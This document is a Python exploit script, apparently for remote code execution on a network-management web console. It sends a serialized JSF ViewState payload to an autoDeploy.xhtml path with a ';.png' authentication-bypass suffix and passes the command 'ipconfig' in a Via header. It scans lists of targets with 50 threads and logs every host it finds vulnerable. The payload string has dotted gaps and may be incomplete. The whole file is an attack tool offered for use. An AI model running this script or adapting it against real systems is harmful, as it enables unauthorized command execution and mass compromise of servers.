import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser=argparse.ArgumentParser(description="24-H17-RCE")
    parser.add_argument('-u','--url',help="Please input your url")
    parser.add_argument('-f','--file',help="Please input your file")
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
 
def banner():
    a=""""
    .-..-.                               _             
: :: :                              :_;            
`.  .'.-..-. .--.  ,-.,-.     ,-.,-..-.,-.,-. .--. 
 .' ; : :; :' .; ; : ,. :     : ,. :: :: ,. :' '_.'
:_,'  `.__.'`.__,_;:_;:_;_____:_;:_;:_;:_;:_;`.__.'
                        :_____:                    
                                                   
                                    author:Linzsec
"""
    print(a)

def poc(url):
    target = url+"/imc/dc3dtopo/dc2dtopo/autoDeploy.xhtml;.png"
    headers={
        'User-Agent':'Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/94.0.2558.72Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept':'*/*',
        'Connection': 'close',
        'Accept-Ldwk': 'bG91ZG9uZ3dlbmt1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Via': 'ipconfig',
        'Content-Length': '2186'
    }
    data={
        'javax.faces.ViewState':'8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq%2b4sy0rUOuOdM5ccd2J6LPx8c6%2b53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU%2burahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm%2bwbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG%2bGMrGWFL5%2bwFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl%2bPpEua%2b28h2YCKipVb5S/wOCrg%2bKD3DUFCbdWHQRqDaZyvYsc8C0X7fzutiVUlSB7OdGoCjub9WuW0d2eeDWZmOt3Wunms3SwAbE7R%2bonCRVS8tiYWF8qiQS%2bl0k8Gw/Hz6Njpfe0upLIAtPFNDuSf69qGg4isEmY2FtoSQTdD8vU0BdJatHrBArPgo9Qsp0jSJBlUz2OqteQg05PYO6gEBXVj/RiTBHI1/pOzlcE0wVZcLUHnxGNvckSCTiT....nWbkWGJ8AYCvrM0PHZ/BYcKKRf3rMHoIqcAN%2bORMhXcmAXRcvq29c5xqoOuvrMSJPDZmbZhcm/99crGJSO5HxXQder9WKm2tVBaDLEC9ulpWyICJYgfxayoWkt6vwPcq2Tn20vn5RDpfqJKLNLbrV8g7JDRUUyW%2b....R6PRNunKhfJHvHcXAZ73mkCUf7cMUbNhqCbLSGP/D%2bqpqWXk5ZWjsT4tQ9tFH9uvPIaNB7FlcFXI2I2A9oPoY0ltif%2bb8BdPXVfpuZq8boHE4hY%2b33BIl%2bIa%2bov6nyMmGIzCKYeRbfDJtk/45EXvink6BIgA/205la6vvqKTGQ32o1AtepBgKei....604cVvbEP7UKor09Gz61mryE4D%2biXG1prZGCT3LEtdASuCkmf4RTEc5wks2In3ElZSZl8zf3RsHA0dgbvrpnXe2wLPI%2bUCAGO%2biOG9/%2bbCQJQNFmykkyRbmslfcilUxZ%2bIg%2bQuOs9FlMod2ICrkktOFFeZWNeznx737S8H4Nf2%2bp2QNHY2I6GFGtWpqjeZ%2bGmb1euM5Tzi06eJ.......koPrjkDT9VPoxCgpRMQl06x7NShkos7BCI9fV1%2b17t5gWZvqAYzeQUsZLaiBXaZfuUtPuBmbq1re/dB/VgSOn4QX%2b8AwwDjtfazsHw4aIdh4e2a1y/Ou2ZiI//EzkwIBksY6CluuPgocdvtOfNiWcXsfYs3UKLmL/48A4Ls0OF1TrQK4UnfCYt.....1DGrwzfXnM9vLHznFaJenqvLY3yTiKN5SSVxvGwvhmp6PFW4Jj7G8NXdr/zN7HyC9Eg1Y1jKP7uiO%2bGM2U/etvMOCKwnfP2MnbznP378fZHf1H9yiVVrn%2bm%2b0u8PV.....2MsOTgS6B7C8ItflgSfJz5dkJ8IssRAcY%2bu/2QjrW95BBMSRPu2EaCUm1IpuszXEwHYgDizWPzDB0hSRgCEjncpGhPX3i10bK4/snBaBcAxAa1e2er2LDe/4WgaIwc9w2wKn3wXY5B87BKF5/Xq30....NNf6EMRrQ9154rEkCJb4IU4sFsTuyYlfZatlV%2bC2HM7u7FEbdVvr6yYK4oQqvfPmF5yRplwAYUQAvr1jwLbGYxhGaTy14UUrtvoyph5Sqebk2YTKjKX4U7xX5ha4YbyoVIMSRzdvB6YXDY3BId%2bgmMWZtTf2UE%2b9UAx/7g30pQNXA....FP1adq6ySd4x3dGVCe4YJcYe2gKWYVcWj5XPwUSt2fxdshzgFnjjqmRgxowH2u2nZU0xG539lnxIOlB'
    }
    try:
        req = requests.post(target,headers=headers,data=data)
        response = req.text
        if re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',response):
            print("%s is vulnerable" % target)
            with open('H17E.txt', 'a+') as f1:
                f1.write(f'{target}\n')
            print('[+]' + target + ' is vulnerable')
            return True
        else:
             print("%s is not vulnerable" % target)

    except Exception as e:
        print ("Something happend....")
        print (e)
        

if __name__ == '__main__':
    main()